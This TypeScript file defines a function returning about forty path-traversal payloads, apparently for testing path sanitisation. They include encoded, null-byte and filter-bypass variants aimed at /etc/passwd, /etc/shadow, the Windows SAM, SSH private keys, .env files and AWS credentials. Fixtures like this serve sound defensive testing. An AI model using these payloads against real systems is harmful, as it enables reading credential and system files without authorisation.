export type TraversalPayload = { name: string; path: string; encoding: string; risk: string };

// Build a payload set that covers raw, encoded, absolute, and null-byte traversal attempts.
export function generateTraversalPayloads(): TraversalPayload[] {
  return [
    // Basic traversal - Unix
    { name: 'basic_unix', path: '../../../etc/passwd', encoding: 'none', risk: 'Access /etc/passwd' },
    { name: 'deep_unix', path: '../../../../../../../../etc/passwd', encoding: 'none', risk: 'Deep traversal to root' },
    { name: 'relative_unix', path: './../../etc/shadow', encoding: 'none', risk: 'Relative path to shadow file' },

    // Basic traversal - Windows
    { name: 'basic_windows', path: '..\\..\\..\\windows\\system32\\config\\SAM', encoding: 'none', risk: 'Access Windows SAM file' },
    { name: 'deep_windows', path: '..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', encoding: 'none', risk: 'Deep Windows traversal' },
    { name: 'mixed_slashes', path: '../..\\../etc/passwd', encoding: 'none', risk: 'Mixed slash types' },

    // URL encoded
    { name: 'url_encoded_basic', path: '..%2F..%2F..%2Fetc%2Fpasswd', encoding: 'url', risk: 'URL encoded traversal' },
    { name: 'url_encoded_backslash', path: '..%5C..%5C..%5Cwindows%5Csystem32', encoding: 'url', risk: 'URL encoded Windows path' },

    // Double URL encoded
    { name: 'double_encoded_slash', path: '%252e%252e%252f%252e%252e%252f%252e%252e%252f', encoding: 'double', risk: 'Double encoding bypass' },
    { name: 'double_encoded_backslash', path: '%252e%252e%255c%252e%252e%255c', encoding: 'double', risk: 'Double encoded backslash' },

    // Unicode encoded
    { name: 'unicode_slash', path: '..\\u002f..\\u002f..\\u002fetc\\u002fpasswd', encoding: 'unicode', risk: 'Unicode encoded slashes' },
    { name: 'unicode_backslash', path: '..\\u005c..\\u005c..\\u005c', encoding: 'unicode', risk: 'Unicode backslashes' },

    // UTF-8 overlong encoding
    { name: 'overlong_slash', path: '..%c0%af..%c0%af..%c0%af', encoding: 'overlong', risk: 'UTF-8 overlong encoding' },
    { name: 'overlong_backslash', path: '..%c0%5c..%c0%5c', encoding: 'overlong', risk: 'Overlong backslash' },

    // Null byte injection
    { name: 'null_byte_unix', path: '../../../../etc/passwd%00.pdf', encoding: 'null', risk: 'Null byte truncation' },
    { name: 'null_byte_windows', path: '..\\..\\..\\windows\\system32\\config\\SAM%00.txt', encoding: 'null', risk: 'Windows null byte' },
    { name: 'null_byte_middle', path: '../etc%00/passwd', encoding: 'null', risk: 'Null in middle of path' },

    // Absolute paths - Unix
    { name: 'absolute_unix', path: '/etc/passwd', encoding: 'none', risk: 'Direct absolute path' },
    { name: 'absolute_home', path: '/root/.ssh/id_rsa', encoding: 'none', risk: 'SSH private key' },
    { name: 'absolute_tmp', path: '/tmp/malicious', encoding: 'none', risk: 'Temp directory access' },
    { name: 'absolute_var', path: '/var/log/auth.log', encoding: 'none', risk: 'Log file access' },

    // Absolute paths - Windows
    { name: 'absolute_windows_c', path: 'C:\\Windows\\System32\\config\\SAM', encoding: 'none', risk: 'Windows C: drive' },
    { name: 'absolute_windows_unc', path: '\\\\localhost\\c$\\windows\\system32', encoding: 'none', risk: 'UNC path access' },
    { name: 'absolute_windows_drive', path: 'D:\\sensitive\\data.txt', encoding: 'none', risk: 'Alternative drive access' },

    // Tricky combinations
    { name: 'dot_slash_combo', path: './../.../../etc/passwd', encoding: 'none', risk: 'Mixed ./ and ../' },
    { name: 'multiple_dots', path: '....//....//....//etc/passwd', encoding: 'none', risk: 'Multiple dots' },
    { name: 'forward_backward_mix', path: '../..\\../etc/passwd', encoding: 'none', risk: 'Forward and backward slashes' },

    // Bypass filters
    { name: 'filter_bypass_dot_dot', path: '..././..././..././etc/passwd', encoding: 'none', risk: 'Bypass ../ filter' },
    { name: 'filter_bypass_backslash', path: '..\\.\\..\\.\\..\\etc\\passwd', encoding: 'none', risk: 'Bypass with .\\' },
    { name: 'case_variation', path: '../../../ETC/PASSWD', encoding: 'none', risk: 'Case variation (Windows)' },

    // Web root escape
    { name: 'web_root_escape', path: '../../../../../../var/www/html/.htaccess', encoding: 'none', risk: 'Apache config access' },
    { name: 'nginx_config', path: '../../../etc/nginx/nginx.conf', encoding: 'none', risk: 'Nginx config' },
    { name: 'php_config', path: '../../../../etc/php/php.ini', encoding: 'none', risk: 'PHP configuration' },

    // Application config files
    { name: 'env_file', path: '../../../.env', encoding: 'none', risk: 'Environment variables' },
    { name: 'git_config', path: '../../../.git/config', encoding: 'none', risk: 'Git configuration' },
    { name: 'ssh_config', path: '../../../../.ssh/config', encoding: 'none', risk: 'SSH configuration' },
    { name: 'aws_credentials', path: '../../../.aws/credentials', encoding: 'none', risk: 'AWS credentials' },

    // Special file names
    { name: 'dev_null', path: '/dev/null', encoding: 'none', risk: 'Device file access' },
    { name: 'proc_self', path: '/proc/self/environ', encoding: 'none', risk: 'Process environment' },
    { name: 'proc_cmdline', path: '/proc/self/cmdline', encoding: 'none', risk: 'Command line args' },
  ];
}
